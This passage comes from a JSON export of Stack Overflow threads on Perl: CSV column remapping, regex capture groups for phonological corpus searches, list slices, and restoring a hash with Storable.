"https://i.stack.imgur.com/kCmqs.png?s=128&g=1", "display_name": "PerlDuck", "link": "https://stackoverflow.com/users/5830574/perlduck"}, "edited": false, "score": 0, "creation_date": 1467562674, "post_id": 35249823, "comment_id": 63770874, "body": "@PerlDog: It has repercussions that I wasn&#39;t aware of. Also <code>use qw&#47; all FATAL &#47;</code> simply doesn&#39;t work because of a bug in the pragma"}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "reply_to_user": {"reputation": 5334, "user_id": 5830574, "user_type": "registered", "accept_rate": 93, "profile_image": "https://i.stack.imgur.com/kCmqs.png?s=128&g=1", "display_name": "PerlDuck", "link": "https://stackoverflow.com/users/5830574/perlduck"}, "edited": false, "score": 0, "creation_date": 1467563415, "post_id": 35249823, "comment_id": 63771109, "body": "@PerlDog: They were never right, it is just that no one noticed the problem"}], "tags": [], "owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "is_accepted": true, "score": 1, "last_activity_date": 1467561293, "last_edit_date": 1467561293, "creation_date": 1454820230, "answer_id": 35249823, "question_id": 35249320, "link": "https://stackoverflow.com/questions/35249320/perl-key-pair-using-cells-of-a-csv-file/35249823#35249823", "title": "PERL key pair using cells of a csv file", "body": "<p>This appears to do what you're asking for. A hash isn't appropriate for relating integers to strings \u2014 you want an array for that. You also didn't explain what should happen when the new number doesn't correspond to any of the original values, so I've used <code>BLANK</code> which is what your own code does</p>\n\n<pre><code>use strict;\nuse warnings 'all';\n\nmy @fruits;\n\nchomp(my @data = &lt;DATA&gt;);\n\nfor ( @data ) {\n    my @fields = split /,/;\n    my ($fruit, $n) = @fields[0,3];\n    $fruits[$n] = $fruit;\n}\n\nfor ( @data ) {\n    my @fields = split /,/;\n    $fields[0] = $fruits[++$fields[3]] // 'BLANK';\n    print join(',', @fields), \"\\n\";\n}\n\n__DATA__\nAPPLE,GREEN,FRUIT,1\nTURNIP,WHITE,VEG,2\nPLUM,RED,FRUIT,3\nAPPLE,GREEN,FRUIT,1\nPLUM,RED,FRUIT,3\nORANGE,ORANGE,FRUIT,4\nSPUD,BROWN,VEG,5\nPLUM,RED,FRUIT,3\nORANGE,GREEN,FRUIT,4\nPLUM,RED,FRUIT,3\nORANGE,ORANGE,FRUIT,4\nSPUD,BROWN,VEG,5\nPLUM,RED,FRUIT,3\nORANGE,ORANGE,FRUIT,4\n</code></pre>\n\n<h3>output</h3>\n\n<pre><code>TURNIP,GREEN,FRUIT,2\nPLUM,WHITE,VEG,3\nORANGE,RED,FRUIT,4\nTURNIP,GREEN,FRUIT,2\nORANGE,RED,FRUIT,4\nSPUD,ORANGE,FRUIT,5\nBLANK,BROWN,VEG,6\nORANGE,RED,FRUIT,4\nSPUD,GREEN,FRUIT,5\nORANGE,RED,FRUIT,4\nSPUD,ORANGE,FRUIT,5\nBLANK,BROWN,VEG,6\nORANGE,RED,FRUIT,4\nSPUD,ORANGE,FRUIT,5\n</code></pre>\n"}], "owner": {"reputation": 329, "user_id": 3360439, "user_type": "registered", "accept_rate": 42, "profile_image": "https://www.gravatar.com/avatar/63da06daffec34266d0b72030f141820?s=128&d=identicon&r=PG&f=1", "display_name": "user3360439", "link": "https://stackoverflow.com/users/3360439/user3360439"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 43, "favorite_count": 0, "accepted_answer_id": 35249823, "answer_count": 1, "score": 0, "last_activity_date": 1467561293, "creation_date": 1454815360, "question_id": 35249320, "link": "https://stackoverflow.com/questions/35249320/perl-key-pair-using-cells-of-a-csv-file", "title": "PERL key pair using cells of a csv file", "body": "<p>that is created from col0 and col3 of a csv file, i then do a sum of + 1 to the col3 key value.\n Next i want to change all the col0 cells to the hash key  associated with col3 value. How do i do that?\nIn essence if value of col3 changes col0 should be updated with its keypair.</p>\n\n<pre><code>use strict;\nuse warnings;\n\nmy @arrayfruit;\nmy %fruits = ();\nforeach (&lt;DATA&gt;) {\n    chomp;\n    my $line     = $_;\n    my @elements = split( \",\", $line );\n    my $fruit    = $elements[0];\n    my $color    = $elements[1];\n    my $type     = $elements[2];\n    my $nmbr     = $elements[3];\n    %fruits = ( $fruit =&gt; $nmbr );\n\n    my $new_nmbr = $nmbr + 1;\n\n    print \"key number =  $nmbr  &lt;---&gt;  value fruit = $fruit \\n\"\n      foreach ( keys %fruits );\n\n    push @arrayfruit, \"$fruit, $color  ,$type ,$new_nmbr \\n\";\n}\n\n__DATA__\nAPPLE,GREEN,FRUIT,1\nTURNIP,WHITE,VEG,2\nPLUM,RED,FRUIT,3\nAPPLE,GREEN,FRUIT,1\nPLUM,RED,FRUIT,3\nORANGE,ORANGE,FRUIT,4\nSPUD,BROWN,VEG,5\nPLUM,RED,FRUIT,3\nORANGE,GREEN,FRUIT,4\nPLUM,RED,FRUIT,3\nORANGE,ORANGE,FRUIT,4\nSPUD,BROWN,VEG,5\nPLUM,RED,FRUIT,3\nORANGE,ORANGE,FRUIT,4\n\n\n\nExpected Data\nTURNIP,GREEN,FRUIT,2\nPLUM,WHITE,VEG,3\nORANGE,RED,FRUIT,4\nAPPLE,GREEN,FRUIT,2\nORANGE,RED,FRUIT,4\nSPUD,ORANGE,FRUIT,5\nBLANK,BROWN,VEG,6\nORANGE,RED,FRUIT,4\nSPUD,GREEN,FRUIT,5\nORANGE,RED,FRUIT,4\nSPUD,ORANGE,FRUIT,5\nblank,BROWN,VEG,6\nORANGE,RED,FRUIT,4\nORANGE,ORANGE,FRUIT,5\n</code></pre>\n"}, {"tags": ["regex", "perl"], "comments": [{"owner": {"reputation": 20968, "user_id": 2564301, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/a6b5734cdcb5ce19598ccf9a7d8cc1ff?s=128&d=identicon&r=PG&f=1", "display_name": "Jongware", "link": "https://stackoverflow.com/users/2564301/jongware"}, "edited": false, "score": 1, "creation_date": 1454807592, "post_id": 35248582, "comment_id": 58210859, "body": "Well done on the What Have You Tried front, but for more clarity: can you add a few To match and To Not match words?"}, {"owner": {"reputation": 728, "user_id": 5209289, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/3874e84d81711bf6751461e0be235976?s=128&d=identicon&r=PG&f=1", "display_name": "Lisa", "link": "https://stackoverflow.com/users/5209289/lisa"}, "reply_to_user": {"reputation": 20968, "user_id": 2564301, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/a6b5734cdcb5ce19598ccf9a7d8cc1ff?s=128&d=identicon&r=PG&f=1", "display_name": "Jongware", "link": "https://stackoverflow.com/users/2564301/jongware"}, "edited": false, "score": 0, "creation_date": 1454808174, "post_id": 35248582, "comment_id": 58210965, "body": "Yes, sorry! Here&#39;s some nonsense words. Match: bog go, clock gun, hog kite. No match: talking go, ark glue, bark grab."}, {"owner": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "edited": false, "score": 1, "creation_date": 1454818290, "post_id": 35248582, "comment_id": 58212752, "body": "Your conditions are pretty complex and seem kind of arbitrary. Is this for homework (perfectly fine if it is) or are you trying to solve a real-world problem? If it&#39;s a real-world problem, I&#39;m curious what it is. Natural language processing or something like that?"}, {"owner": {"reputation": 728, "user_id": 5209289, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/3874e84d81711bf6751461e0be235976?s=128&d=identicon&r=PG&f=1", "display_name": "Lisa", "link": "https://stackoverflow.com/users/5209289/lisa"}, "edited": false, "score": 0, "creation_date": 1454819887, "post_id": 35248582, "comment_id": 58213024, "body": "I&#39;m interested in word final velars before other stop consonants - this regex is the &quot;control&quot; case of velars preceding velars. I want to compare that to velars preceding coronas and labials (and more specifically, look for cases of assimilation within these two). The corpus I&#39;m working with is not transcribed phonetically, so I&#39;m working with the orthography. Thanks for your interest!"}, {"owner": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "edited": false, "score": 0, "creation_date": 1454840630, "post_id": 35248582, "comment_id": 58217164, "body": "This is a really good example of why &quot;single magic regex&quot;  is a bad thing to do."}], "answers": [{"comments": [{"owner": {"reputation": 728, "user_id": 5209289, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/3874e84d81711bf6751461e0be235976?s=128&d=identicon&r=PG&f=1", "display_name": "Lisa", "link": "https://stackoverflow.com/users/5209289/lisa"}, "edited": false, "score": 0, "creation_date": 1454865252, "post_id": 35251153, "comment_id": 58225299, "body": "This works perfectly! Thank you. I am new to perl and regexes so I often suspect I have needless things in my code, so thank you for helping me clean it up!"}], "tags": [], "owner": {"reputation": 7787, "user_id": 1257035, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/WHLC8.png?s=128&g=1", "display_name": "a3f", "link": "https://stackoverflow.com/users/1257035/a3f"}, "is_accepted": true, "score": 2, "last_activity_date": 1454842168, "last_edit_date": 1454842168, "creation_date": 1454832174, "answer_id": 35251153, "question_id": 35248582, "link": "https://stackoverflow.com/questions/35248582/capture-word-from-regex-match/35251153#35251153", "title": "Capture word from regex match", "body": "<p>What about <code>/(\\S*(((?&lt;!n)g)|(?&lt;!r)k))\\s(g(?!l|r)|k|c(?!i|e|y|h))/</code>?</p>\n\n<p>EDIT: Looking at it, it could use some clean up :D</p>\n\n<pre><code>/(\\S*([^n]g|[^r]k))\\s(g[^lr]|k|c[^ieyh])/\n</code></pre>\n"}], "owner": {"reputation": 728, "user_id": 5209289, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/3874e84d81711bf6751461e0be235976?s=128&d=identicon&r=PG&f=1", "display_name": "Lisa", "link": "https://stackoverflow.com/users/5209289/lisa"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 134, "favorite_count": 0, "accepted_answer_id": 35251153, "answer_count": 1, "score": 2, "last_activity_date": 1454842168, "creation_date": 1454807445, "last_edit_date": 1454808475, "question_id": 35248582, "link": "https://stackoverflow.com/questions/35248582/capture-word-from-regex-match", "title": "Capture word from regex match", "body": "<p>I am working on a regex in perl, which identifies what I want it to: word final g (but not following an 'n') or k (but not following an 'r') that precedes word-initial g (but not l or r), word-initial k, or word-initial c (but not c preceding i, e, y, or h):</p>\n\n<p><code>(((?&lt;!n)g)|(?&lt;!r)k)\\s(g(?!l|r)|k|c(?!i|e|y|h));</code></p>\n\n<p>However, I want it to capture the word that has the g or k at the end of it, so I tried something like this:\n<code>(^|\\s.*(((?&lt;!n)g)|(?&lt;!r)k))\\s(g(?!l|r)|k|c(?!i|e|y|h));</code> so that <code>$1</code> captures the beginning of the line or a white space (to signify the beginning of a word) until the next white space before the g, k, or c (the end of the word). Perhaps this is a parentheses problem, but I'm not sure how to keep the grouping I have while also specifying where I want <code>$1</code> to capture.</p>\n"}, {"tags": ["regex", "perl"], "comments": [{"owner": {"reputation": 155387, "user_id": 978917, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/92d059913eace78a868a3e87f98e0a57?s=128&d=identicon&r=PG", "display_name": "ruakh", "link": "https://stackoverflow.com/users/978917/ruakh"}, "edited": false, "score": 2, "creation_date": 1454799958, "post_id": 35247584, "comment_id": 58208905, "body": "Putting parentheses around <code>(a|e|i|o|u)?(a|e|i|o|u)</code> is indeed the correct solution; if that didn&#39;t work, then something else is wrong."}, {"owner": {"reputation": 155387, "user_id": 978917, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/92d059913eace78a868a3e87f98e0a57?s=128&d=identicon&r=PG", "display_name": "ruakh", "link": "https://stackoverflow.com/users/978917/ruakh"}, "edited": false, "score": 5, "creation_date": 1454799998, "post_id": 35247584, "comment_id": 58208923, "body": "(Incidentally, I think it&#39;s more readable to write <code>[aeiou]?[aeiou][gk]</code> -- or even <code>[aeiou]{1,2}[gk]</code> -- rather than <code>(a|e|i|o|u)?(a|e|i|o|u)(g|k)</code>. But, up to you.)"}, {"owner": {"reputation": 728, "user_id": 5209289, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/3874e84d81711bf6751461e0be235976?s=128&d=identicon&r=PG&f=1", "display_name": "Lisa", "link": "https://stackoverflow.com/users/5209289/lisa"}, "reply_to_user": {"reputation": 155387, "user_id": 978917, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/92d059913eace78a868a3e87f98e0a57?s=128&d=identicon&r=PG", "display_name": "ruakh", "link": "https://stackoverflow.com/users/978917/ruakh"}, "edited": false, "score": 0, "creation_date": 1454800578, "post_id": 35247584, "comment_id": 58209087, "body": "Actually, I&#39;m working with IPA characters... I think this is why it&#39;s not working. Thank you for your help!"}], "answers": [{"tags": [], "owner": {"reputation": 865, "user_id": 5888860, "user_type": "registered", "profile_image": "https://graph.facebook.com/10153265400236581/picture?type=large", "display_name": "Jim Driscoll", "link": "https://stackoverflow.com/users/5888860/jim-driscoll"}, "is_accepted": true, "score": 2, "last_activity_date": 1454800602, "creation_date": 1454800602, "answer_id": 35247689, "question_id": 35247584, "link": "https://stackoverflow.com/questions/35247584/optionality-and-or-in-capturing-groups-in-perl/35247689#35247689", "title": "Optionality and &quot;or&quot; in capturing groups in perl", "body": "<p>$1 will be unset if the optional first capture doesn't match anything; that doesn't imply that $2 is unset. If you want $1 to be empty instead, you need to wrap the brackets around it, i.e. ([aeiou]?). In if you really needed to use alternation and the optional indicator then you would need two levels of brackets, and for that case you'd probably want to turn capturing off for the inner one with \"?:\", i.e. ((?:a|e|i|o|u)?).</p>\n"}], "owner": {"reputation": 728, "user_id": 5209289, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/3874e84d81711bf6751461e0be235976?s=128&d=identicon&r=PG&f=1", "display_name": "Lisa", "link": "https://stackoverflow.com/users/5209289/lisa"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 159, "favorite_count": 0, "accepted_answer_id": 35247689, "answer_count": 1, "score": 2, "last_activity_date": 1454800602, "creation_date": 1454799866, "question_id": 35247584, "link": "https://stackoverflow.com/questions/35247584/optionality-and-or-in-capturing-groups-in-perl", "title": "Optionality and &quot;or&quot; in capturing groups in perl", "body": "<p>I want to get a capturing group in a regex that has several \"or\"s and an optional group. This my my regex: <code>(a|e|i|o|u)?(a|e|i|o|u)(g|k)</code>\nI want it to find one or two vowels before a g or a k - like \"taek\" and \"tag\".</p>\n\n<p>I tried putting parenthesis around <code>(a|e|i|o|u)?(a|e|i|o|u)</code> but <code>$1</code> is still uninitialized.</p>\n"}, {"tags": ["perl", "text", "hash", "storable"], "answers": [{"comments": [{"owner": {"reputation": 13, "user_id": 2226206, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/073b72ddb9db8791431e7d682ceaab1e?s=128&d=identicon&r=PG", "display_name": "Slufgest", "link": "https://stackoverflow.com/users/2226206/slufgest"}, "edited": false, "score": 0, "creation_date": 1454811509, "post_id": 35246967, "comment_id": 58211566, "body": "Thanks Grrrr! I&#39;ll look into the error catching, but this got me over a 3 day hurdle."}], "tags": [], "owner": {"reputation": 2399, "user_id": 420431, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b661d2be6b4699e60f7b837a298451a0?s=128&d=identicon&r=PG", "display_name": "Grrrr", "link": "https://stackoverflow.com/users/420431/grrrr"}, "is_accepted": true, "score": 2, "last_activity_date": 1454795947, "creation_date": 1454795947, "answer_id": 35246967, "question_id": 35246673, "link": "https://stackoverflow.com/questions/35246673/trouble-recalling-hashes-from-file-in-perl/35246967#35246967", "title": "Trouble recalling hashes from file in Perl", "body": "<p>The <code>store</code> function comes from the module <code>Storable</code> (you can see full documentation for the module by typing <code>perldoc Storable</code>).</p>\n\n<p>It's counterpart is called <code>retrieve</code>.</p>\n\n<p>So in order to read back the contacts on the script start you can replace the line</p>\n\n<pre><code>my %contact; while (){\n</code></pre>\n\n<p>with</p>\n\n<pre><code>my %contact;\neval {\n    %contact = %{ retrieve \"pb.txt\" };\n};\nwhile (1) {\n</code></pre>\n\n<p>The <code>eval</code> makes the retrieval not die on error (whether because <code>pb.txt</code> is not there or does not contain the data in a format compatible with <code>Storable</code>).  You might want to have somewhat more elaborate error handling instead of just ignoring any errors, but this should do as an example.</p>\n"}], "owner": {"reputation": 13, "user_id": 2226206, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/073b72ddb9db8791431e7d682ceaab1e?s=128&d=identicon&r=PG", "display_name": "Slufgest", "link": "https://stackoverflow.com/users/2226206/slufgest"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 70, "favorite_count": 0, "accepted_answer_id": 35246967, "answer_count": 1, "score": 1, "last_activity_date": 1457785707, "creation_date": 1454794076, "last_edit_date": 1457785707, "question_id": 35246673, "link": "https://stackoverflow.com/questions/35246673/trouble-recalling-hashes-from-file-in-perl", "title": "Trouble recalling hashes from file in Perl", "body": "<p>This phone book script works well in memory but I am having a difficult time recalling the saved data on re execution. The hashes go to the text file but I have no idea how to recall them when the script is starting. I have used \"Storage\" to save the data, and I have tried to use the \"retrieve\"function to bring the data back, with no luck. I think either I did not follow a good path from the start or I just don't know where in the code or which %hash should \"retrieve\" the stored data.</p>\n\n<p>I am very new to Perl and programming so I hope I explained my situation clearly</p>\n\n<pre><code>#!/usr/bin/perl\n\nuse 5.18.2;\nuse strict;\nuse warnings;\nuse autodie;\nuse Scalar::Util qw(looks_like_number); # This is used to determine if the phone number entered is valid.\nuse Storable;\nuse Data::Dumper;\n\n####################################\n# Enables sub selections\nmy %contact; while (){\n    my $selection = list();\n\n    if ($selection == 1){\n        addContact();\n    }\n    elsif ($selection == 2){\n        removeContact();\n    }\n    elsif ($selection == 3){\n                findContact();\n    }\n    elsif ($selection == 4){\n        listAllContacts();\n    }\n    elsif ($selection == 5) {\n                clearScreen();\n        }\n    elsif ($selection == 888) {\n        quit();\n    }\n    else {\n        print \"Invalid entry, Please try again.\\n\\n\"; # displays error message\n    }\n}\n####################################\n# Shows instructions for use\nsub list{\n    print \"\\n------------------------------------------------------------------------\\n\";\n    print \"-                     ----- Select an option -----                     -\\n\"; \n    print \"- 1 = add, 2 = remove, 3 = find, 4 = list, 5 = tidy screen, 888 = quit -\\n\";\n    print \"------------------------------------------------------------------------\\n\";\n    print \"What would you like to do? \";\n    my $listChoice = &lt;STDIN&gt;; # enter sub choice here\n    return $listChoice;\n}\n\n####################################\n# Add contact info sub\nsub addContact{\n    print\"Name?: \";\n    chomp (my $addContactName = &lt;STDIN&gt;); # contact name\n    $addContactName = lc($addContactName); # changes all letters to lower-case\n    if (exists $contact{$addContactName}){ # checks for duplicate contact\n        print\"Duplicate Record!!! Please enter a different name\\n\\n\"; # displays error message\n    } \n    else {\n        print\"Phone Number?(omit dashes, ex. 1235551212): \";\n        chomp (my $phoneNumber = &lt;STDIN&gt;); # phone number\n                if (looks_like_number($phoneNumber)){ # checks that its only numbers\n            $contact{$addContactName} = $phoneNumber; # adds hash to contact\n#               open (FILE, \"&gt;&gt;pb.txt\"); # file to save contact info\n#               print FILE $addContactName .= \":\", $phoneNumber .= \"\\n\"; # add a colon and new line to contact info in text file\n        }\n        else{\n            print \"Phone Numbers do not have letters!, Let's start again.\\n\\n\"; # displays error message\n        }\n    }\n}\n\n####################################\n# sub to remove contact\nsub removeContact {\n    print\"Enter name to remove: \\n\";\n    chomp (my $removeContact = &lt;STDIN&gt;); # enter contact name to remove\n    $removeContact = lc($removeContact); # changes all letters to lower-case\n    if (exists $contact{$removeContact}){ # looks for contact name\n        delete($contact{$removeContact}); # delete contact name and all info\n        print\"The contact \\' $removeContact \\' has been removed\\n\"; # gives confirmation of contact removal\n        } \n    else {\n                print\"This name does not exist in the record!! Try Again.\\n\\n\"; # displays error message\n        }\n}\n\n####################################\n# sub to find a contact\nsub findContact {\n    print\"Whom are you looking for?: \\n\";\n    chomp(my $findContact = &lt;STDIN&gt;); # enter contact name to find\n    $findContact = lc($findContact); # changes all letters to lower-case\n    if (exists $contact{$findContact}) { # looks for contact name\n        print($contact{$findContact},\"\\n\\n\"); # prints info for found contact name\n    } \n    else {\n        print\"This name does not exist in the record!!! Try Again.\\n\\n\"; # displays error message\n    }\n}\n\n###############################################\n# Lists all contacts entered alphabetically\nsub listAllContacts {\n    for my $key (sort keys %contact) { # sorts contacts alphabetically \n    print \"$key, $contact{$key}\\n\"; # shows all contacts on screen\n    }\n}\n\n#################################################\n# Tidy sub - just clears the screen of clutter\nsub clearScreen {\n    system(\"clear\");\n}\n\n####################################\n# sub to leave the program\nsub quit{\n        store (\\%contact, \"pb.txt\"); # save data to text file\n    system(\"clear\"); # clears screen\n    exit(); # exits program\n}\n</code></pre>\n"}, {"tags": ["arrays", "perl"], "comments": [{"owner": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "edited": false, "score": 2, "creation_date": 1454768239, "post_id": 35241844, "comment_id": 58197926, "body": "I think you&#39;re a little confused about lists vs. arrays. See <a href=\"http://friedo.com/blog/2013/07/arrays-vs-lists-in-perl\" rel=\"nofollow noreferrer\">Arrays vs. Lists in Perl: What&#39;s the Difference?</a>"}, {"owner": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "edited": false, "score": 1, "creation_date": 1454771817, "post_id": 35241844, "comment_id": 58199110, "body": "This may be premature optimisation though. Check if it actually matters before faffing about."}, {"owner": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "reply_to_user": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "edited": false, "score": 0, "creation_date": 1454772096, "post_id": 35241844, "comment_id": 58199199, "body": "@Sobrique I&#39;d be more worried about memory usage than speed in this case."}, {"owner": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "edited": false, "score": 0, "creation_date": 1454772203, "post_id": 35241844, "comment_id": 58199230, "body": "Yes, with a mahoosive array, popping the last. But if you&#39;ve a mahoosive array (and memory iis a concern), I&#39;d be tempted to not use a sub that created (and returned) it in the first place."}, {"owner": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "edited": false, "score": 1, "creation_date": 1454772362, "post_id": 35241844, "comment_id": 58199281, "body": "Your test cases are maybe 2x speed improvement in a single operation. That&#39;s insignificant, unless you&#39;re doing it a lot in your program. And if you are, you really want to better optimise the generate-and-return, not the popping last element."}], "answers": [{"comments": [{"owner": {"reputation": 1714, "user_id": 1839508, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/530d84518abcb1591e5e7cedf682097d?s=128&d=identicon&r=PG", "display_name": "n.r.", "link": "https://stackoverflow.com/users/1839508/n-r"}, "edited": false, "score": 0, "creation_date": 1454768301, "post_id": 35242013, "comment_id": 58197935, "body": "Nice. Just for the record this takes 0.440 seconds here."}, {"owner": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "reply_to_user": {"reputation": 1714, "user_id": 1839508, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/530d84518abcb1591e5e7cedf682097d?s=128&d=identicon&r=PG", "display_name": "n.r.", "link": "https://stackoverflow.com/users/1839508/n-r"}, "edited": false, "score": 0, "creation_date": 1454769101, "post_id": 35242013, "comment_id": 58198231, "body": "Be aware that <code>range()</code> is called in list context here. Lots of built-in functions have different behavior in list vs. scalar context, e.g. <code>localtime</code>."}, {"owner": {"reputation": 1714, "user_id": 1839508, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/530d84518abcb1591e5e7cedf682097d?s=128&d=identicon&r=PG", "display_name": "n.r.", "link": "https://stackoverflow.com/users/1839508/n-r"}, "edited": false, "score": 0, "creation_date": 1454769106, "post_id": 35242013, "comment_id": 58198234, "body": "The parentheses enclosing <code>$last</code> are meant to avoid a list count, right?"}, {"owner": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "reply_to_user": {"reputation": 1714, "user_id": 1839508, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/530d84518abcb1591e5e7cedf682097d?s=128&d=identicon&r=PG", "display_name": "n.r.", "link": "https://stackoverflow.com/users/1839508/n-r"}, "edited": false, "score": 0, "creation_date": 1454769448, "post_id": 35242013, "comment_id": 58198347, "body": "With the parens the RHS is evaluated in list context; without, scalar context. Slices in scalar context return the last item in the slice, so in this case it doesn&#39;t make a difference."}], "tags": [], "owner": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "is_accepted": true, "score": 5, "last_activity_date": 1454768929, "last_edit_date": 1454768929, "creation_date": 1454767980, "answer_id": 35242013, "question_id": 35241844, "link": "https://stackoverflow.com/questions/35241844/how-to-the-access-the-last-item-of-a-list-returned-by-a-subroutine-without-copyi/35242013#35242013", "title": "How to the access the last item of a list returned by a subroutine without copying it into an array first?", "body": "<p>Subroutines don't return arrays, they only return lists. But you're correct that</p>\n\n<pre><code>my @array = list();\n</code></pre>\n\n<p>copies the values returned by <code>list()</code> into an array. If you only care about the last value, you can use a <a href=\"http://perldoc.perl.org/perldata.html#Slices\" rel=\"nofollow\">list slice</a>:</p>\n\n<pre><code>use strict;\nuse warnings 'all';\nuse 5.010;\n\nsub range {\n    return 0 .. 10**7;\n}\n\nmy ($last) = ( range() )[-1];\nsay $last; # 10000000\n</code></pre>\n"}], "owner": {"reputation": 1714, "user_id": 1839508, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/530d84518abcb1591e5e7cedf682097d?s=128&d=identicon&r=PG", "display_name": "n.r.", "link": "https://stackoverflow.com/users/1839508/n-r"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 554, "favorite_count": 0, "closed_date": 1454771206, "accepted_answer_id": 35242013, "answer_count": 1, "score": 4, "last_activity_date": 1454768929, "creation_date": 1454766959, "last_edit_date": 1454768760, "question_id": 35241844, "link": "https://stackoverflow.com/questions/35241844/how-to-the-access-the-last-item-of-a-list-returned-by-a-subroutine-without-copyi", "closed_reason": "Duplicate", "title": "How to the access the last item of a list returned by a subroutine without copying it into an array first?", "body": "<p>I'm looking for a computationally less expensive way to access the last item of a list returned by a subroutine (without modifying the subroutine itself).</p>\n\n<p>As I see it what I'm doing below is actually copying the returned list into a named array <code>@list</code>, or into an anonymous array <code>[]</code>, and then accessing the last value of that array, not directly the last item of the returned list.</p>\n\n<p>Is there any shortcut here? How can I directly access the last item of the returned list?</p>\n\n<pre><code>sub range { return 0 .. 10**7 }\n</code></pre>\n\n<p>This takes 0.808 seconds of user time according to GNU <code>time</code>:</p>\n\n<pre><code>my @array = range();\nprint pop @array;\n</code></pre>\n\n<p>And here 0.792 seconds:</p>\n\n<pre><code>my @array = range();\nprint $array[$#array], \"\\n\"\n</code></pre>\n\n<p>0.680 seconds:</p>\n\n<pre><code>print pop [ range() ]\n</code></pre>\n"}, {"tags": ["perl", "nginx"], "comments": [{"owner": {"reputation": 11913, "user_id": 1016033, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1daac942e48a293ad867d186bd519376?s=128&d=identicon&r=PG", "display_name": "Alexey Ten", "link": "https://stackoverflow.com/users/1016033/alexey-ten"}, "edited": false, "score": 0, "creation_date": 1454744556, "post_id": 35238069, "comment_id": 58191441, "body": "<a href=\"http://nginx.org/en/docs/http/ngx_http_empty_gif_module.html\" 